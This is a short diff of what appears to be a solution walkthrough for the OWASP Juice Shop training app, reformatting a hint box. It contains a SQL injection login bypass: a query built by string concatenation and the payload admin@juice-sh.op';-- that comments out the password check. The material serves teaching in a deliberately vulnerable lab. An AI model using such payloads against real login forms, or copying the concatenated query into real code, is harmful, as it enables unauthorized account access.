@@ -207,15 +207,22 @@ Don't forget to comment out the trash after the injected commands.
 ```javascript
 "SELECT * FROM Users WHERE email = '" + email + "' AND password = '" + f(password) + "' AND deletedAt IS NULL;"
 ```
-</details>
+
 There are multiple possibilities, but the easiest is `admin@juice-sh.op';--`, as this will result in
+
 ```sql
 SELECT * FROM Users WHERE email = 'admin@juice-sh.op';--' AND password = '" + f(password) + "' AND deletedAt IS NULL;
 ```
+
 which is equivalent to
+
 ```sql
 SELECT * FROM Users WHERE email = 'admin@juice-sh.op';
 ```
+
+</details>
+
+
 4. Login with `admin@juice-sh.op';--` as email and an arbitrary password.
 
 
